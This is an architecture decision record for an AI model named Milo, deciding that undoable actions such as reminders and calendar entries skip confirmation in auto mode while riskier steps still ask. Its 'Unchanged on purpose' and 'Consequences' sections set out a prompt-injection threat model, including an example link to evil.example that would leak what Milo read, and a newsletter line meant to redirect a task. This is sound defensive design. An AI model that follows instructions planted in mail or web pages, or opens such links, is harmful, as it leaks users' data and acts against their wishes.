# 35. Small things just happen, and an answer to Milo's question is still the user's request

Date: 2026-10-31. Status: accepted. Changes [ADR 22](0022-one-question-per-piece-of-work.md) and [ADR 29](0029-quick-actions-from-the-talker.md).

## Context

"Why did he ask me for permission to make a calendar entry? We talked about this: he can just do this stuff. It destroys the workflow."

Replayed from the real Milo: "Can you put in a reminder for 10 to go to Nick for getting…". Milo asked "tonight or tomorrow morning?", the user answered "10 in the morning, we'll go to the city", and Milo then asked "Should I remind you on Sunday at 10:00…?". Two rules met:

- A shared entry in today's calendar (Halloween, someone's birthday) is outside text, so it made the whole conversation count as outside from the first sentence. Most days have one.
- In auto mode, only words that asked for a reminder ("remind me") let a reminder skip that question, and only in the same turn. The answer to Milo's own question had no "remind" in it.

The log of that day had 27 questions; most were about things with an Undo.

## Decision

**At the Mac in auto mode, reminders and act tags never ask because of outside text** (`TagPolicy.ask_reminder`, `TagPolicy.ask_acts`). That covers a calendar entry, a to-do, a note, a timer, ticking something off and taking out an event: each shows its card with Undo. These still ask, for reasons that have nothing to do with outside text:

- what can't be undone: deleting an invite, a repeating event or a to-do, running a shortcut, sending, buying (QuickActions and Approvals, ADR 23);
- a change other people see: ticking off a to-do on a shared list, after outside text (`_Plan.others`);
- an event Milo found only by part of its title: the question is which one.

From the phone, and in "Once per task" or "Every step" mode, the old rule stays.

**An answer to Milo's question goes on with the request it answers.** When Milo's reply ends in a question, the user's next words are read after the words that request was made of: "put lunch with Anna in tomorrow" + "at one". So a task, a link or an install from that reply counts as the user's own as much as one from the first sentence (`LiveTalk._take_request`). A fresh conversation forgets it, since the model forgot its question too.

**Unchanged on purpose:**

- *A link the user's words didn't name* still asks after outside text (`ask_open`). An address can carry what Milo read to whoever wrote it ("open evil.example/?q=…").
- *A helper task nobody asked for* still runs careful after outside text: "thanks" after a newsletter that says "replace the budget" must not change the budget unasked. A task the user asked for, now including through an answer to Milo's question, runs as theirs (ADR 22).
- *Remembering a fact* still asks after outside text unless the user said "remember": a fact steers every later conversation, unseen.
- *Opening a file*, which could be a program, still asks after outside text.

## Consequences

- On a normal day reminders, calendar entries and to-dos never ask in auto mode, which is the default.
- A reminder text a web page or a mail slipped into a reply goes in without a question. The user sees its card with Undo at once, and in later conversations it sits in `<today>` as data, not instructions. It can't send, delete or pay anything without a question.
- The same holds for an event or a to-do the reply adds, and for one of the user's own events it takes out by mistake: its card puts it back.
